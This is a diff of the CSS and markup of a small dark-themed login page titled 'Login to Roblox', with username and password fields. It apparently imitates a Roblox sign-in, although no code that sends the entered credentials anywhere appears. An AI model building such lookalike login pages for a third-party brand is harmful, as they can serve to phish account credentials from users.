@@ -11,14 +11,13 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #232527; /* Background color set to #232527 */
+            background-color: #232527;
         }
         .container {
-            background-color: #393b3d; /* Container color set to #393b3d */
+            background-color: #393b3d;
             padding: 20px;
             border-radius: 5px;
-            width: 500px;
-            height: 250px;
+            width: 250px; /* 50% of the previous width */
             text-align: center;
         }
         .login-container {
@@ -29,20 +28,16 @@
             background-color: rgba(255, 255, 255, 0.8);
             color: black;
         }
-        input {
-            width: 80%;
+        input, button {
+            width: 60%; /* Reduced width to 60% for a 50% reduction in visual width */
             padding: 10px;
             margin-bottom: 10px;
             border: 1px solid #ccc;
             border-radius: 4px;
         }
         button {
-            width: 80%;
-            padding: 10px;
-            margin-bottom: 10px;
             border: 1px solid white;
-            border-radius: 4px;
-            background-color: #393b3d; /* Button color set to #393b3d */
+            background-color: #393b3d;
             color: white;
             cursor: pointer;
         }
@@ -50,13 +45,13 @@
             background-color: #505050;
         }
         h2 {
-            color: white; /* Title color set to white */
+            color: white;
         }
     </style>
 </head>
 <body>
     <div class="container login-container">
-        <h2>Login to Roblox</h2> <!-- Title changed to "Login to Roblox" -->
+        <h2>Login to Roblox</h2>
         <form id="loginForm">
             <input type="text" id="username" name="username" placeholder="Username" required>
             <input type="password" id="password" name="password" placeholder="Password" required>
